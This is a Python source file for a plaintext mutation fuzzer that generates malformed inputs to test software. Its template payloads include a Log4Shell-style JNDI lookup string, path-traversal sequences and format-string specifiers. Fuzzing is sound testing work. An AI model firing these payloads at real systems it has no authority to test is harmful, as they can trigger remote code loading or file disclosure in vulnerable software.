import random
import string
import re

from .base_fuzzer import BaseFuzzer


WHITESPACE_PATTERNS = [
    " ",
    "\t",
    "\r",
    "\n",
    "\r\n",
    "    ",
    "\t\t",
    " \t ",
    "\x00",
]


class PlaintextFuzzer(BaseFuzzer):
    def __init__(self, example_input):
        super().__init__(example_input)
        try:
            decoded = example_input.decode("utf-8", errors="ignore")
        except Exception:
            decoded = ""
        self.original_text = decoded
        normalized = decoded.replace("\r\n", "\n").replace("\r", "\n")
        self.text = normalized
        self.lines = [ln for ln in normalized.splitlines()] if normalized else []
        self.words = []
        for ln in self.lines:
            for token in ln.strip().split():
                if token:
                    self.words.append(token)

    def _encode(self, text):
        return text.encode("utf-8", errors="ignore")

    def _random_ascii(self, min_len=1, max_len=32):
        length = random.randint(min_len, max_len)
        alphabet = string.ascii_letters + string.digits + string.punctuation
        return "".join(random.choice(alphabet) for _ in range(length))

    def _line_mutation(self):
        lines = list(self.lines) or self.text.splitlines()
        if not lines:
            return self.example_input

        mutated = lines[:]
        action = random.choice(["delete", "duplicate", "shuffle", "insert"])
        if action == "delete" and mutated:
            del mutated[random.randrange(len(mutated))]
        elif action == "duplicate" and mutated:
            idx = random.randrange(len(mutated))
            mutated.insert(random.randrange(len(mutated) + 1), mutated[idx] * random.randint(1, 4))
        elif action == "shuffle" and len(mutated) > 1:
            random.shuffle(mutated)
        elif action == "insert":
            payload = self._random_ascii(4, 64)
            mutated.insert(random.randrange(len(mutated) + 1), payload)

        return self._encode("\n".join(mutated))

    def _word_mutation(self):
        words = list(self.words)
        if not words:
            words = re.findall(r"[A-Za-z0-9_]+", self.text)
        if not words:
            return self.example_input

        choice = random.choice(words)
        mutated = choice
        mutation_type = random.choice(["repeat", "flipcase", "replace", "format"])
        if mutation_type == "repeat":
            mutated = choice * random.randint(2, 10)
        elif mutation_type == "flipcase":
            mutated = "".join(ch.swapcase() if ch.isalpha() else ch for ch in choice)
        elif mutation_type == "replace":
            mutated = self._random_ascii(len(choice), len(choice) + 8)
        else:  # format injection
            mutated = choice + "%s%n%x%d%p"

        text = self.text or self.example_input.decode("latin-1", errors="ignore")
        if not text:
            return self.example_input
        start = random.randint(0, max(0, len(text) - 1))
        return self._encode(text[:start] + mutated + text[start:])

    def _whitespace_mutation(self):
        text = self.text or self.example_input.decode("latin-1", errors="ignore")
        if not text:
            return self.example_input
        pattern = random.choice(WHITESPACE_PATTERNS)
        mutated = re.sub(r"\s+", pattern, text)
        # randomly pad with whitespace flood
        if random.random() < 0.5:
            mutated = pattern * random.randint(5, 50) + mutated + pattern * random.randint(5, 50)
        return self._encode(mutated)

    def _numeric_mutation(self):
        text = self.text or self.example_input.decode("latin-1", errors="ignore")
        if not text:
            return self.example_input

        def repl(match):
            base = random.choice([
                "0",
                str(2 ** 31 - 1),
                str(2 ** 31),
                str(65535),
                str(10 ** random.randint(3, 6)),
                str(random.randint(100, 999999)),
            ])
            if random.random() < 0.5:
                if not base.startswith('-'):
                    base = "-" + base
            return base

        mutated = re.sub(r"\d+", repl, text, count=random.randint(1, 5))
        return self._encode(mutated)

    def _control_sequence_mutation(self):
        payload = "".join(chr(random.randint(0, 31)) for _ in range(random.randint(8, 64)))
        return self._encode(payload)

    def _template_payload(self):
        patterns = [
            "{0}{0}{0}",
            "${jndi:ldap://example.com/a}",
            "<<EOF\n{}\nEOF",
            "../" * random.randint(5, 20),
        ]
        template = random.choice(patterns)
        insertion = self._random_ascii(4, 32)
        if "{}" in template or "{0}" in template:
            try:
                return self._encode(template.format(insertion))
            except Exception:
                return self._encode(template + insertion)
        return self._encode(template + insertion)

    def generate(self):
        """Generate mutated plaintext inputs."""
        yield b""
        yield self.example_input
        yield b"\n".join([self.example_input for _ in range(5)])
        yield self._encode(self.text.upper() if self.text else "")
        yield self._encode(self.text.lower() if self.text else "")
        if self.text:
            for neg in ("-1", "-16", "-1024", "-999999"):
                candidate = re.sub(r"\d+", neg, self.text, count=1)
                if candidate and candidate != self.text:
                    yield self._encode(candidate)

        mutation_strategies = [
            lambda: self.mutate_bytes(self.example_input),
            self._line_mutation,
            self._word_mutation,
            self._whitespace_mutation,
            self._numeric_mutation,
            self._control_sequence_mutation,
            self._template_payload,
        ]

        while True:
            strategy = random.choice(mutation_strategies)
            yield strategy()
